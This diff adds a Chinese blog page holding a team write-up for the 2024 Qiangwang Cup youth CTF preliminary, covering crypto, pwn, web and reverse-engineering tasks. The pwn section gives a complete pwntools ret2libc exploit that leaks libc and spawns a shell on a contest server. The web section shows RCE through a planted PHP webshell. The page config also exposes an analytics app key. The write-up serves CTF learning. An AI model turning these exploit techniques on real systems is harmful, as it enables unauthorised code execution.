@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言:大龄选手摸鱼打比赛，因为当天要赶飞机也没好好研究剩下的web题，放上来抄一下冷饭吧，以下是团队wp，排名28 cryptoClassics按照给的html进行逆向解码得到flag  easymath计算2331位的二进制数中有多少个数字同时满足：是奇数且不包含连续4个0或1的条件，将这个计数值的下一个质数作为RSA的第一个质因子p。通过状态机和动态规划计算满足规则的路径总数，作为密钥 key">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024强网杯青少赛初赛">
+<meta property="og:url" content="https://0ran9ewww.github.io/2024/11/26/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="前言:大龄选手摸鱼打比赛，因为当天要赶飞机也没好好研究剩下的web题，放上来抄一下冷饭吧，以下是团队wp，排名28 cryptoClassics按照给的html进行逆向解码得到flag  easymath计算2331位的二进制数中有多少个数字同时满足：是奇数且不包含连续4个0或1的条件，将这个计数值的下一个质数作为RSA的第一个质因子p。通过状态机和动态规划计算满足规则的路径总数，作为密钥 key">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/back.png">
+<meta property="article:published_time" content="2024-11-26T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-26T14:42:50.531Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/back.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2024强网杯青少赛初赛 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y20YQnBmfM0DqawGjwxeWhCq-gzGzoHsz","app_key":"Y55Ca02EpnhoEzDEjf7sqVwX","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/back.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024强网杯青少赛初赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-26 22:00" pubdate>
+          2024年11月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024强网杯青少赛初赛</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月26日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>前言:大龄选手摸鱼打比赛，因为当天要赶飞机也没好好研究剩下的web题，放上来抄一下冷饭吧，以下是团队wp，排名28</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classics"><a href="#Classics" class="headerlink" title="Classics"></a>Classics</h2><p>按照给的html进行逆向解码得到flag</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24102142.png" srcset="/img/loading.gif" lazyload alt="2024-11-24102142"></p>
+<h2 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h2><p>计算2331位的二进制数中有多少个数字同时满足：是奇数且不包含连续4个0或1的条件，将这个计数值的下一个质数作为RSA的第一个质因子p。通过状态机和动态规划计算满足规则的路径总数，作为密钥 <code>key</code>。7 个状态，分别表示连续 1 和 0 的长度及中性状态,动态规划记录每个位置在不同状态的路径数，最终统计以 <code>1</code> 结尾的路径。然后进行正常的RSA解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><br>n = <span class="hljs-number">739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059</span><br>c = <span class="hljs-number">229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743</span><br>e = <span class="hljs-number">65537</span><br>l = <span class="hljs-number">2331</span>  <span class="hljs-comment"># DP 序列长度</span><br><br><span class="hljs-comment"># 状态机定义</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_transition</span>():<br>    transition = &#123;s: &#123;&#125; <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)&#125;<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]:  <span class="hljs-comment"># 连续的 1</span><br>                co = s<br>                transition[s][b] = co + <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> co + <span class="hljs-number">1</span> &lt; <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">4</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> s <span class="hljs-keyword">in</span> [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]:  <span class="hljs-comment"># 连续的 0</span><br>                cz = s - <span class="hljs-number">3</span><br>                transition[s][b] = cz + <span class="hljs-number">4</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> cz + <span class="hljs-number">1</span> &lt; <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 中性状态</span><br>                transition[s][b] = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> transition<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_key</span>(<span class="hljs-params">l, transition</span>):<br>    DP = [[<span class="hljs-number">0</span>] * <span class="hljs-number">7</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br>    DP[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 初始化为状态 1</span><br><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, l - <span class="hljs-number">1</span>):<br>        curr, prev = pos % <span class="hljs-number">2</span>, (pos - <span class="hljs-number">1</span>) % <span class="hljs-number">2</span><br>        DP[curr] = [<span class="hljs-number">0</span>] * <span class="hljs-number">7</span><br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>            <span class="hljs-keyword">if</span> DP[prev][s] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]:<br>                next_s = transition[s][b]<br>                <span class="hljs-keyword">if</span> next_s != -<span class="hljs-number">1</span>:<br>                    DP[curr][next_s] += DP[prev][s]<br><br>    <span class="hljs-comment"># 处理最后一位为 1 的情况</span><br>    total = <span class="hljs-number">0</span><br>    curr = (l - <span class="hljs-number">2</span>) % <span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">if</span> DP[curr][s] == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        next_s = transition[s][<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> next_s != -<span class="hljs-number">1</span>:<br>            total += DP[curr][s]<br>    <span class="hljs-keyword">return</span> total<br><br><span class="hljs-comment"># 求解 RSA 因子和解密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rsa</span>(<span class="hljs-params">n, c, e, key</span>):<br>    p = <span class="hljs-built_in">int</span>(next_prime(key))<br>    q = n // p<br>    <span class="hljs-keyword">assert</span> p * q == n, <span class="hljs-string">&quot;分解 n 失败！&quot;</span><br><br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = inverse(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br><br>transition = build_transition()<br>key = compute_key(l, transition)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算得到的密钥: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    flag = decrypt_rsa(n, c, e, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密后的 flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密失败: <span class="hljs-subst">&#123;ex&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="AliceAES"><a href="#AliceAES" class="headerlink" title="AliceAES"></a>AliceAES</h2><p>AES简单了解，使用给定的key iv加密Hello, Bob!，加密结果为hex，提交得到flag</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142935619.png" srcset="/img/loading.gif" lazyload alt="image-20241124142935619"></p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124123012.jpg" srcset="/img/loading.gif" lazyload alt="image-20241124123012"></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="clock-in"><a href="#clock-in" class="headerlink" title="clock_in"></a>clock_in</h2><p>checksec是64位，开NX,FULL RELRO</p>
+<p>ida进行查看</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24213211.png" srcset="/img/loading.gif" lazyload alt="2024-11-24213211"></p>
+<p>get_info有溢出</p>
+<p>用ROPgadget找到rdi地址，为rdi &#x3D; 0x4011c5</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24213454.png" srcset="/img/loading.gif" lazyload alt="2024-11-24213454"></p>
+<p>然后找main函数地址，main &#x3D; 0x401253</p>
+<p>然后先泄露libc偏移地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">rdi = <span class="hljs-number">0x4011c5</span><br>main = <span class="hljs-number">0x401253</span><br>ret = <span class="hljs-number">0x40101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Your info: &quot;</span>)<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br></code></pre></td></tr></table></figure>
+
+<p>然后在计算libc真实地址，并调用system(‘&#x2F;bin&#x2F;sh’)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>, <span class="hljs-number">27962</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./clock&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>rdi = <span class="hljs-number">0x4011c5</span><br>main = <span class="hljs-number">0x401253</span><br>ret = <span class="hljs-number">0x40101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Your info: &quot;</span>)<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><br>system = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libcbase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>payload2 = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(binsh) + p64(rdi+<span class="hljs-number">1</span>) + p64(system)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezGetFlag"><a href="#ezGetFlag" class="headerlink" title="ezGetFlag"></a>ezGetFlag</h2><p>bp改为post发包即可</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24100659.png" srcset="/img/loading.gif" lazyload alt="2024-11-24100659"></p>
+<h2 id="ezFindShell"><a href="#ezFindShell" class="headerlink" title="ezFindShell"></a>ezFindShell</h2><p>下载<a target="_blank" rel="noopener" href="http://www.zip,有很多php,d盾扫一下,有一个不一样的/">www.zip,有很多php，d盾扫一下,有一个不一样的</a></p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24214523.png" srcset="/img/loading.gif" lazyload alt="2024-11-24214523"></p>
+<p>定位，可以直接rce，e&#x3D;c3lzdGVt(system)</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24112132.png" srcset="/img/loading.gif" lazyload alt="2024-11-24112132"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="EnterGame"><a href="#EnterGame" class="headerlink" title="EnterGame"></a>EnterGame</h2><p>chacha20加密，本质还是异或</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242130621.png" srcset="/img/loading.gif" lazyload alt="image-20241124213032567"></p>
+<p>直接patch s为s2，即替换输入为密文</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242131868.png" srcset="/img/loading.gif" lazyload alt="image-20241124213135818"></p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242128319.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-24 113555"></p>
+<p>动调拿到flag</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242128824.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-24 113459"></p>
+<h2 id="Flip-over"><a href="#Flip-over" class="headerlink" title="Flip_over"></a>Flip_over</h2><p>jeb反编译，关键都是so动态库调用</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242134532.png" srcset="/img/loading.gif" lazyload alt="image-20241124213408479"></p>
+<p>逆一下so，找到关键位置</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136851.png" srcset="/img/loading.gif" lazyload alt="image-20241124213611788"></p>
+<p>对<code>a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67</code>进行RC4+DES加密，key为<code>flagflag</code>，生成box</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136132.png" srcset="/img/loading.gif" lazyload alt="image-20241124213642097"></p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136419.png" srcset="/img/loading.gif" lazyload alt="image-20241124213653380"></p>
+<p>再与flag^0x21逐字节异或，与enc比较</p>
+<p>enc：</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242139556.png" srcset="/img/loading.gif" lazyload alt="image-20241124213934520"></p>
+<p>本质还是异或</p>
+<p>exp</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242142061.png" srcset="/img/loading.gif" lazyload alt="image-20241124214210995"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 